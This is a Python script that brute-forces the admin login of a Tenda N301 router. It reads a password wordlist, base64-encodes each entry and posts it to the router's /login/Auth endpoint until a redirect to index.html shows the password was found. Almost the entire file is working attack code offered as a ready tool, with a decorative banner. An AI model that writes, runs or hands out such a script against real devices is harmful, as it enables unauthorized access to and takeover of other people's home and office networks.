import requests, base64

# BruteForce Router Tenda N301
# Coded by Mugi F.
# Github https://github.com/mugi789
# 2022-04-15

print("""\
    \033[36m
     ___             _         ___                    
    | _ ) _ _  _  _ | |_  ___ | __| ___  _ _  __  ___ 
    | _ \| '_|| || ||  _|/ -_)| _| / _ \| '_|/ _|/ -_)
    |___/|_|   \_._| \__|\___||_|  \___/|_|  \__|\___|\033[35m
     ___              _         _ _  ____ ___  _ 
    |_ _| ___  _ _  _| | ___   | \ |[__ /|   |/ |
     | | / ._]| ' |/ . |[_] |  |   | [_ \| / || |
     |_| \___.|_|_|\___|[___|  |_\_|[___/ \__||_| \033[39m \n""")
ip = input("Input IP Router : ")
passwd = input("Input Wordlist : ")
print("========= Scanning ==========")
with open(passwd, 'r') as katasandi:
    for baris in katasandi:
        kata = baris.replace('\n', '')
        encode = base64.b64encode(bytes(kata, 'utf-8')).decode('ascii')
        payload = {
            'password': encode
        }
        login = requests.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True)
        if 'http://'+ip+'/index.html' == login.url:
            print("="*30)
            print("\033[32mPassword Found\033[39m : " + kata)
            break
        else:
            print("Trying "+kata)